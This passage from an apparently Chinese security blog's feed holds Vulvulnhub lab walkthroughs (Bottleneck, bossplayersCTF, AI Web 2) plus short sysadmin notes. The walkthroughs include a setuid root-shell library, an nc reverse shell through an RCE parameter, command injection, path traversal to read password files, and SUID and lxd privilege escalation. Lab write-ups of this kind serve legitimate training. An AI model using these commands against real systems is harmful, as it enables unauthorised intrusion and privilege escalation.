number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改该源代码中的main函数为test_this函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">test_this</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将该动态链接库源码编译为so文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-shared</span> shell.c <span class="token parameter variable">-o</span> shell.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/33.png" class=""><p>编译报错，通过报错信息看出在源码中使用system函数要先声明，因此我们需要在源码中添加system函数的头文件,使用<code>man system</code>查看system函数的头文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">test_this</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重新编译，即可获得shell.so文件。<br>将shell.so文件上传至靶机，然后以<code>bytevsbyte</code>用户身份执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/test/testlib /tmp/shell.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/09/06/Bottleneck/34.png" class=""><p>成功提权到root，查看&#x2F;root下的flag</p><img src="/2023/09/06/Bottleneck/35.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python开启http服务</title>
      <link href="/2023/08/09/python%E5%BC%80%E5%90%AFhttp%E6%9C%8D%E5%8A%A1/"/>
      <url>/2023/08/09/python%E5%BC%80%E5%90%AFhttp%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="python开启http服务"><a href="#python开启http服务" class="headerlink" title="python开启http服务"></a>python开启http服务</h1><h2 id="python2开启http服务"><a href="#python2开启http服务" class="headerlink" title="python2开启http服务"></a>python2开启http服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2 <span class="token parameter variable">-m</span> SimpleHTTPServer <span class="token punctuation">[</span>port<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:如果不指定端口号，则默认端口号为8000</p><h2 id="python3开启http服务"><a href="#python3开启http服务" class="headerlink" title="python3开启http服务"></a>python3开启http服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server <span class="token punctuation">[</span>port<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注:如果不指定端口号，则默认端口号为8000</p>]]></content>
      
      
      <categories>
          
          <category> python攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>bossplayersCTF</title>
      <link href="/2023/07/31/bossplayersCTF/"/>
      <url>/2023/07/31/bossplayersCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="bossplayersCTF靶场闯关"><a href="#bossplayersCTF靶场闯关" class="headerlink" title="bossplayersCTF靶场闯关"></a>bossplayersCTF靶场闯关</h1><p>获取靶机的ip</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.124.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/1.png" class=""><p>对目标进行nmap扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-A</span> -p- <span class="token number">192.168</span>.124.28<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/2.png" class=""><p>可以看到靶机开放了22和80端口。<br>dirb爆破80端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.124.28 <span class="token parameter variable">-X</span> .php,.html,.txt,.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/3.png" class=""><p>dirsearch爆破80端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.124.28"</span> <span class="token parameter variable">-e</span> php,html,zip,txt <span class="token parameter variable">-i</span> <span class="token number">200,401</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/4.png" class=""><p>gobuster爆破80端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.124.28 <span class="token parameter variable">-x</span> .php,.html,.zip,.txt <span class="token parameter variable">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/5.png" class=""><p>我们扫描到<code>index.html</code>,<code>robots.txt</code>,<code>logs.php</code>这三个文件<br>访问index.html</p><img src="/2023/07/31/bossplayersCTF/6.png" class=""><p>没啥发现，查看页面源代码</p><img src="/2023/07/31/bossplayersCTF/7.png" class=""><p>发现了一串base64编码的字符串。<br>访问robots.txt</p><img src="/2023/07/31/bossplayersCTF/8.png" class=""><p>又发现了一串base64编码的字符串。<br>访问logs.php</p><img src="/2023/07/31/bossplayersCTF/9.png" class=""><p>除了看到php版本为7.3之外，未发现其他有价值的信息。<br>对index.html页面发现的base64字符串进行解码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK"</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/10.png" class=""><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K"</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/11.png" class=""><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"d29ya2luZ2lucHJvZ3Jlc3MucGhwCg=="</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/12.png" class=""><p>经过三次base64解码，我们获得了一个<code>workinginprogress.php</code>。<br>对robots.txt中的base64字符串进行解码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"bG9sIHRyeSBoYXJkZXIgYnJvCg=="</span> <span class="token operator">|</span>base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/13.png" class=""><p>访问<code>http://192.168.124.28/workinginprogress.php</code></p><img src="/2023/07/31/bossplayersCTF/14.png" class=""><p>没发现有啥漏洞，burp抓包</p><img src="/2023/07/31/bossplayersCTF/15.png" class=""><p>对<code>workinginprogress.php</code>进行RCE模糊测试</p><img src="/2023/07/31/bossplayersCTF/16.png" class=""><img src="/2023/07/31/bossplayersCTF/17.png" class=""><p>fuzz测试出<code>cmd</code>参数存在RCE漏洞。</p><img src="/2023/07/31/bossplayersCTF/18.png" class=""><p>利用RCE反弹shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-nlvp</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/19.png" class=""><p>由于目标安装了nc<br>访问<code>http://192.168.124.28/workinginprogress.php?cmd=nc 192.168.124.27 1234 -e /bin/bash</code></p><img src="/2023/07/31/bossplayersCTF/20.png" class=""><p>可以看到本机已经拿到了靶机的shell。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于目标安装了python,我们利用以上命令可以获得一个完整交互式shell</p><img src="/2023/07/31/bossplayersCTF/21.png" class=""><p>查看当前用户权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">id</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/22.png" class=""><p>可以看到当前用户权限为低权限，因此我们需要提权。<br>查看是否可以用suid提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/31/bossplayersCTF/23.png" class=""><img src="/2023/07/31/bossplayersCTF/24.png" class=""><p>可以看到&#x2F;usr&#x2F;bin&#x2F;find可执行文件的属主具有suid权限。<br>利用&#x2F;usr&#x2F;bin&#x2F;find进行提权</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> /bin/bash <span class="token parameter variable">-p</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：默认情况下bash在执行时，如果发现euid(即suid)与uid不匹配，会将euid强制重置为uid,加了<code>-p</code>参数则不会再覆盖。</p><img src="/2023/07/31/bossplayersCTF/25.png" class=""><p>可以看到我们现在已经获得了root权限。<br>进入&#x2F;root目录查看flag</p><img src="/2023/07/31/bossplayersCTF/26.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AI Web 2</title>
      <link href="/2023/07/17/AI-Web-2/"/>
      <url>/2023/07/17/AI-Web-2/</url>
      
        <content type="html"><![CDATA[<h1 id="AI-Web-2靶场闯关"><a href="#AI-Web-2靶场闯关" class="headerlink" title="AI Web 2靶场闯关"></a>AI Web 2靶场闯关</h1><p> 获取目标主机的ip地址<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> netdiscover <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.124.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/1.png" class=""><br> 得到靶机ip为192.168.124.20<br> 对靶机进行nmap扫描<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-A</span> -p- <span class="token number">192.168</span>.124.20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/2.png" class=""><br> 可以看到靶机开放了22和80端口以及端口对应的信息。<br> dirb爆破http 80端口目录<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.124.20 <span class="token parameter variable">-X</span> .html,.php,.zip,.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/3.png" class=""><br> dirsearch爆破http 80端口目录<br> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.124.20"</span> <span class="token parameter variable">-e</span> html,php,txt,zip <span class="token parameter variable">-i</span> <span class="token number">200,401</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br> <img src="/2023/07/17/AI-Web-2/4.png" class=""><br> 访问<code>http://192.168.124.20/download.php</code>,发现页面可以下载，但内容为空<br> <img src="/2023/07/17/AI-Web-2/5.png" class=""><br> 访问<code>http://192.168.124.20/index.php</code>,发现是一个只需要输入用户名的登录页面<br> <img src="/2023/07/17/AI-Web-2/6.png" class=""><br> 使用常用帐号登录未果，使用burp爆破也未果<br> <img src="/2023/07/17/AI-Web-2/7.png" class=""><br> <img src="/2023/07/17/AI-Web-2/8.png" class=""><br> 点击index页面的<code>signup</code>注册按钮，注册一个新用户<code>admin</code>,点击ok<br> <img src="/2023/07/17/AI-Web-2/9.png" class=""><br> 继续使用新注册的用户名<code>admin</code>登录<br> <img src="/2023/07/17/AI-Web-2/10.png" class=""><br> 虽然进入后台，但没有发现有价值的信息。<br> google搜索<code>XuezhuLi FileSharing</code><br> <img src="/2023/07/17/AI-Web-2/11.png" class=""><br> 发现该系统存在目录穿越漏洞<br> <img src="/2023/07/17/AI-Web-2/12.png" class=""><br> 该漏洞存在于两个位置<br> <img src="/2023/07/17/AI-Web-2/13.png" class=""><br> 验证第1个漏洞点，访问<code>http://192.168.124.20/download.php?file_name=../../../../../../../../../../../../../etc/passwd</code><br> 靶机的用户名文件被成功下载，文件内容为<br> <img src="/2023/07/17/AI-Web-2/14.png" class=""><br> 证明漏洞点1存在。<br> 验证第2个漏洞点，访问<code>http://192.168.124.20/viewing.php?file_name=../../../../../../../../../../../../../etc/passwd</code><br> <img src="/2023/07/17/AI-Web-2/15.png" class=""><br> 漏洞点2验证失败。<br> 根据读取到的&#x2F;etc&#x2F;passwd文件我们获得了靶机的三个用户<code>root aiweb2 n0nr00tuser</code><br> 由于靶机开放22端口，因此对靶机的ssh进行爆破，未果。<br> 由于靶机80端口服务是apache,因此利用目录穿越漏洞读取靶机apache2的认证文件，访问<code>http://192.168.124.20/download.php?file_name=../../../../../../../../../../../../../etc/apache2/.htpasswd</code><br> <img src="/2023/07/17/AI-Web-2/16.png" class=""><br>使用john破解密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt htpasswd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显示john破解出的密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--show</span> htpasswd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/17/AI-Web-2/17.png" class=""><p>得到apache2认证的帐号密码为<code>aiweb2admin</code>:<code>c.ronaldo</code><br>访问<code>http://192.168.124.20/webadmin/</code>,输入apache2认证的帐号密码</p><img src="/2023/07/17/AI-Web-2/18.png" class=""><p>点击登录，进入webadmin目录</p><img src="/2023/07/17/AI-Web-2/19.png" class=""><p>根据页面提示访问robots文件<code>http://192.168.124.20/webadmin/robots.txt</code></p><img src="/2023/07/17/AI-Web-2/20.png" class=""><p>访问<code>http://192.168.124.20/webadmin/H05Tpin9555/</code></p><img src="/2023/07/17/AI-Web-2/21.png" class=""><p>ping 127.0.0.1,burp抓包</p><img src="/2023/07/17/AI-Web-2/22.png" class=""><p>将请求数据包发送到repeater模块，测试<code>ip</code>参数是否存在RCE漏洞<br>构造<code>ip=127.0.0.1|whoami</code></p><img src="/2023/07/17/AI-Web-2/23.png" class=""><p>成功获取到当前用户<code>www-data</code>,说明<code>|</code>可以绕过执行单一命令的限制<br>继续依次测试<code>||</code>，<code>&amp;</code>，<code>&amp;&amp;</code>，<code>;</code>,均未能绕过。<br>访问<code>http://192.168.124.20/webadmin/S0mextras/</code></p><img src="/2023/07/17/AI-Web-2/24.png" class=""><p>根据页面显示的内容我们判断该目录下应该存在有趣的东西。<br>查看当前路径<code>ip=127.0.0.1|pwd</code></p><img src="/2023/07/17/AI-Web-2/25.png" class=""><p>可以看到当前路径是<code>/var/www/html/webadmin/H05Tpin9555</code><br>列出<code>/S0mextras/</code>目录下的所有东西<code>ip=127.0.0.1|ls -al /var/www/html/webadmin/S0mextras/</code></p><img src="/2023/07/17/AI-Web-2/26.png" class=""><p>只有一个index.html<br>继续使用<code>find</code>命令查找<code>ip=127.0.0.1|find . -type f /var/www/html/webadmin/S0mext</code><br>注：<code>.</code>表示当前目录，<code>f</code>表示普通文件</p><img src="/2023/07/17/AI-Web-2/27.png" class=""><p>查看<code>/var/www/html/webadmin/S0mextras/.sshUserCred55512.txt</code>文件</p><img src="/2023/07/17/AI-Web-2/28.png" class=""><p>得到了ssh用户名密码<code>n0nr00tuser:zxowieoi4sdsadpEClDws1sf</code><br>连接靶机的ssh端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> n0nr00tuser@192.168.124.20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入密码，成功进入靶机系统</p><img src="/2023/07/17/AI-Web-2/29.png" class=""><p>查看当前用户可以用sudo执行哪些命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/17/AI-Web-2/30.png" class=""><p>显示当前用户无权限执行sudo命令。<br>查看当前系统内核版本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/17/AI-Web-2/31.png" class=""><p>显示当前系统内核是<code>linux 4.15</code>的内核。<br>尝试内核提权，搜索<code>linux 4.15</code>的内核提权漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit linux kernel <span class="token number">4.15</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/17/AI-Web-2/32.png" class=""><p>我选择47167.sh作为提权脚本，在靶机系统上下载下来运行</p><img src="/2023/07/17/AI-Web-2/33.png" class=""><p>注：如果sh脚本执行显示<code>/bin/sh^M: bad interpreter: No such file or directory</code>，这是由于不同系统编码格式引起的，则需要vim打开该sh脚本，然后<code>set ff=unix</code></p><img src="/2023/07/17/AI-Web-2/34.png" class=""><p>提示当前用户没有权限执行<code>sudo apt install gcc</code>命令，因此内核提权无法进行。<br>下载<code>LinEnum</code>到靶机来搜集信息进行提权<br>注：<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./LinEnum.sh <span class="token parameter variable">-r</span> report.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/17/AI-Web-2/35.png" class=""><p>我们可以看到当前系统内存在<code>lxd容器</code>，因此我们搜索lxd的提权漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit lxd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/17/AI-Web-2/36.png" class=""><p>将lxd提权脚本下载到靶机系统上进行执行</p><img src="/2023/07/17/AI-Web-2/37.png" class=""><p>我们这里可以看到<code>-f</code>参数需要提供一个.tar.gz的alpine文件<br>查看脚本的帮助信息</p><img src="/2023/07/17/AI-Web-2/38.png" class=""><p>根据脚本帮助信息首先在自己主机上执行<code>wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</code><br>然后在自己主机上构建alpine<code>sudo ./build-alpine</code><br>alpine构建完成后会在当前目录下生成一个.tar.gz的文件，然后将该文件上传到靶机系统内。<br>在靶机系统内继续执行lxd提权脚本</p><img src="/2023/07/17/AI-Web-2/39.png" class=""><p>可以看到我们已经获得了root权限。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /mnt/root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/07/17/AI-Web-2/40.png" class=""><p>此时我们相当于已经进入了靶机的系统根目录。<br>由于flag文件存在于靶机的root目录中，因此我们继续cd到靶机的root目录</p><img src="/2023/07/17/AI-Web-2/41.png" class=""><p>读取flag文件内容</p><img src="/2023/07/17/AI-Web-2/42.png" class="">]]></content>
      
      
      <categories>
          
          <category> 靶场渗透 </category>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>docker版mysql数据库备份</title>
      <link href="/2022/11/03/docker%E7%89%88mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD/"/>
      <url>/2022/11/03/docker%E7%89%88mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="docker版mysql数据库备份"><a href="#docker版mysql数据库备份" class="headerlink" title="docker版mysql数据库备份"></a>docker版mysql数据库备份</h1><h2 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> 容器id mysqldump <span class="token parameter variable">-uroot</span> -p数据库密码  要备份的数据库名称  <span class="token operator">></span> 自定义目录/test.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="导入sql文件"><a href="#导入sql文件" class="headerlink" title="导入sql文件"></a>导入sql文件</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">create database 数据库名use 数据库名<span class="token builtin class-name">source</span> test.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">create database 数据库名<span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-i</span> 容器id mysql <span class="token parameter variable">-uroot</span> -p数据库密码  要导入的数据库名称 <span class="token operator">&lt;</span> 自定义目录/test.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux下升级nginx</title>
      <link href="/2022/11/03/linux%E4%B8%8B%E5%8D%87%E7%BA%A7nginx/"/>
      <url>/2022/11/03/linux%E4%B8%8B%E5%8D%87%E7%BA%A7nginx/</url>
      
        <content type="html"><![CDATA[<h1 id="linux下升级nginx"><a href="#linux下升级nginx" class="headerlink" title="linux下升级nginx"></a>linux下升级nginx</h1><p>查看旧版本nginx安装目录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>备份nginx配置文件nginx.conf:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> nginx.conf nginx.conf.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载nginx新版本压缩包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://nginx.org/download/nginx-1.22.0.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解压nginx压缩包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/local<span class="token function">tar</span> <span class="token parameter variable">-xzvf</span> nginx-1.22.0.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看旧版nginx编译参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nginx <span class="token parameter variable">-V</span><span class="token comment">#如果有编译参数，则在编译新版本nginx时附加对应参数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编译新版nginx:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> nginx-1.22.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure     <span class="token comment">#适用于旧版本nginx没有编译参数的情况</span><span class="token function">make</span>或./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/自定义路径/nginx      <span class="token comment">#适用于旧版本nginx不是默认路径的情况</span><span class="token function">make</span>或./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module<span class="token operator">&amp;&amp;</span><span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>备份旧版本nginx可执行文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx.old<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制新版本nginx可执行文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> nginx-1.22.0/objs/nginx /usr/local/nginx/sbin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试新版本nginx配置是否正常:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> nginx/sbin./nginx <span class="token parameter variable">-t</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>验证nginx是否升级成功:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./nginx <span class="token parameter variable">-V</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关闭原来的nginx进程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">kill</span> <span class="token parameter variable">-9</span> pid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动新版本nginx并执行配置文件:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./nginx <span class="token parameter variable">-c</span> /usr/local/nginx/conf/nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查新版nginx运行状态：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通过ssh连接升级远程服务器openssh版本</title>
      <link href="/2022/11/01/%E9%80%9A%E8%BF%87ssh%E8%BF%9E%E6%8E%A5%E5%8D%87%E7%BA%A7%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8openssh%E7%89%88%E6%9C%AC/"/>
      <url>/2022/11/01/%E9%80%9A%E8%BF%87ssh%E8%BF%9E%E6%8E%A5%E5%8D%87%E7%BA%A7%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8openssh%E7%89%88%E6%9C%AC/</url>
      
